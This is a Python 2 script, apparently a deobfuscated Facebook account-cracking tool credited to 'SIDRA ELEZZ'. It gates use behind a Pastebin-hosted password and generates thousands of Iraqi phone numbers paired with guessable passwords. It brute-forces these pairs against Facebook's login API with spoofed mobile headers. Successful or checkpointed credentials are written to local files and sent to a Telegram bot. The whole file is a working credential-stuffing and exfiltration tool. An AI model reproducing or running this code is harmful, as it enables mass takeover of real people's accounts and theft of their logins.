# DECRYPTED BY xXx_not_found_xXx
# Github : https://github.com/hamalord4444
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
try:
	import requests
except ImportError:
	os.system("pip2 install tqdm")
try:    
    import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass,mechanize,requests
    from multiprocessing.pool import ThreadPool
    from requests.exceptions import ConnectionError
    from mechanize import Browser
    from tqdm import tqdm
    from time import sleep 
    from colorama import init, Fore, Back
except ImportError:
    os.system('pip2 install requests')
    os.system('pip2 install mechanize')
    os.system('pip2 install tqdm')
    
#Browser Setting

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000.0, 40000.0)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)

#----------------------------------------------------[colors]----------------------------------------------------#
A = "\033[1;91m"
B = "\033[1;90m"
C = "\033[1;97m"
E = "\033[1;92m"
H = "\033[1;93m"
K = "\033[1;94m"
L = "\033[1;95m"
#----------------------------------------------------[Banner]----------------------------------------------------#
Sidra= """ 
   \033[1;92m  _________ __      ___                
   \033[1;97m /   _____/|__|  __| _/_______ _____   
   \033[1;97m \_____  \ |  | / __ | \_  __ \\__  \  
   \033[1;97m /        \|  |/ /_/ |  |  | \/ / __ \_
   \033[1;97m/_______  /|__|\____ |  |__|   (____  /
   \033[1;92m        \/          \/              \/   

\033[1;93m < \033[1;92mTHE TOOL IS FREE\033[1;93m >  \033[1;91m 
 ---------------------------
 \033[1;91m(\033[1;92m*\033[1;91m) \033[1;97mAUTHOR     : SIDRA ELEZZ
 \033[1;91m(\033[1;92m*\033[1;91m) \033[1;97mTelegram   : SIDRATOOLS
 \033[1;91m(\033[1;92m*\033[1;91m) \033[1;97mYOUTUBE    : TERMUX TOOLS
 \033[1;91m(\033[1;92m*\033[1;91m) \033[1;97mGITHUB     : GITHUB.COM/SIDRAELEZZ
""" 

                         
IRAQ ="""
         \033[1;97m####    ########      #######  
         \033[1;97m ##     ##     ##    ##     ## 
         \033[1;97m ##     ##     ##    ##     ## 
         \033[1;97m ##     ########     ##     ## 
         \033[1;97m ##     ##   ##      ##  ## ## 
         \033[1;97m ##     ##    ##     ##    ##  
         \033[1;97m####    ##     ##     ##### ## 

            \033[1;92m   CRACK FROM IRAQ
\033[1;97m--------------------------------------------------
\033[1;97m
 AUTHOR     : SIDRA ELEZZ
 Telegram   : TERMUX TOOLS
 YOUTUBE    : TERMUX TOOLS
 GITHUB     : GITHUB.COM/SIDRA ELEZZ
\033[1;37m
--------------------------------------------------\n                                    
"""
#----------------------------------------------------[Pastebin]----------------------------------------------------#



def psb(s):
	for ASU in s + '\n':
		sys.stdout.write(ASU)
		sys.stdout.flush()
		sleep(50. / 700)
		
re = requests.get("https://pastebin.com/raw/BM46rqf7")
print Sidra
print "\033[1;97mFIRST STEP OF LOGIN"
print "\033[1;97m--------------------"
print "\033[1;97m " 
password = raw_input("          \033[1;93mTOOL PASSWORD: ")
print E
if password == "" :
  sys.exit()
if password in str(re.text):
  psb(H+" FIRST STEP Is Done. Logged in Successfully as ")
  print "\033[1;93m "
  psb("\033[1;93mPlease Wait 5 Minutes, All Packages Are Checking.....")
else:
  print " Wrong Password !"
  os.system('xdg-open https://t.me/TT_RQ/1')
  sys.exit()
os.system('clear')
os.system('rm -rf .1.txt')
def telegram_bot_sendtext(bot_message):
    
    global email , p , token , ID 
    bot_token = token
    bot_chatID = ID
    #bot_message = "* Email : <" +email+p+"@yahoo.com>\n"
    send_text = 'https://api.telegram.org/bot' + bot_token + '/sendMessage?chat_id=' + bot_chatID + '&parse_mode=Markdown&text=' + bot_message

    response = requests.get(send_text)

    return response.json()
                                                 
os.system("clear")
print(Sidra)
ID = raw_input(A+'['+C+'*'+A+']'+H+'  ID Telegram: \n'+L) 
token = raw_input(A+'['+C+'*'+A+']'+H+'  Token Bot: \n'+L)  
	
for lol in range(2500):
	x1= random.randint(1000000, 9999999)
	z1= ("+964770"+str(x1)+":0770"+str(x1))
	with open(".1.txt", "a") as Sidr:
		Sidr.write(str(z1)+"\n")
		
	x2= random.randint(1000000, 9999999)
	z2= ("+964771"+str(x2)+":0771"+str(x2))
	with open(".1.txt", "a") as Sidr:
		Sidr.write(str(z2)+"\n")
		
	x3= random.randint(1000000, 9999999)
	z3= ("+964750"+str(x3)+":0750"+str(x3))
	with open(".1.txt", "a") as Sidr:
		Sidr.write(str(z3)+"\n")
		
	x4= random.randint(1000000, 9999999)
	z4= ("+964751"+str(x4)+":0751"+str(x4))
	with open(".1.txt", "a") as Sidr:
		Sidr.write(str(z4)+"\n")
		
	x5= random.randint(1000000, 9999999)
	z5= ("+964780"+str(x5)+":0780"+str(x5))
	with open(".1.txt", "a") as Sidr:
		Sidr.write(str(z5)+"\n")
		
	x6= random.randint(1000000, 9999999)
	z6= ("+964781"+str(x6)+":0781"+str(x6))
	with open(".1.txt", "a") as Sidr:
		Sidr.write(str(z6)+"\n")



def SIDRAA():
	os.system('clear')
	global header,bd,sim
	print(IRAQ)
	
	
	Yes = 0
	No = 0
	Sk = 0
	fil = open('.1.txt', 'r')
	
	
	
	while True:
		
		user = fil.readline().split('\n')[0]
		Email = user.split(':')[0]
		pas= user.split(':')[1]
		
		
		
		api='https://b-api.facebook.com/method/auth.login'
		params={
        'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
        'format': 'JSON',
        'sdk_version': '2',
        'email': Email,
        'locale': 'en_US',
        'password': pas,
        'sdk': 'ios',
        'generate_session_cookies': '1',
        'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',}
		#print
		#print
		response=requests.get(api, params=params, headers=header)
		if 'EAA' in response.text:
			Yes+=1
			
			
			print('\033[1;91m\n [\033[1;92mSIDRA-OK\033[1;91m] \033[1;92m%s \033[1;91m-> \033[1;92m %s '%(str(Email), str(pas)))
			telegram_bot_sendtext(" * Hi Sidra Successful  FB * \n. ================== .\n. * .Email  : " +Email+"\n. * .Pass  : " +pas+"\n. ================== .\n * Tele : @SidraTools")
			with open("OK.txt", "a") as sid:
				sid.write("Email  :"+Email+"\n"+"Pass :"+pas+"\n")
			
			
			
		
		elif 'www.facebook.com' in response.json()['error_msg']:
			No+=1
			print('\033[1;91m\n [\033[1;92mSIDRA-CP\033[1;91m] \033[1;93m%s \033[1;91m-> \033[1;93m %s '%(str(Email), str(pas)))
			telegram_bot_sendtext(" * Hi Sidra Successful  FB * \n. ================== .\n. * .Email  : " +Email+"\n. * .Pass  : " +pas+"\n. ================== .\n * Tele : @SidraTools")
			with open("CP..txt", "a") as sid:
				sid.write("Email  :"+Email+"\n"+"Pass :"+pas+"\n")
			
		else:
			Sk+=1
			os.system('clear')
			print(IRAQ)
			print("{}   Successful {}: {}{}".format(E,A,E,Yes))
			print(E)
			print("{}   Checkpoint {}: {}{}".format(H,A,H,No))
			print(E)
			print("{}   START HACK {}: {}{}".format(K,A,K,Sk))
			print(E)
			print("{}   ===============".format(C))
			
			
			
		
			
         



#----------------------------------------------------[Cod By SidraELEzz]----------------------------------------------------#
SIDRAA()
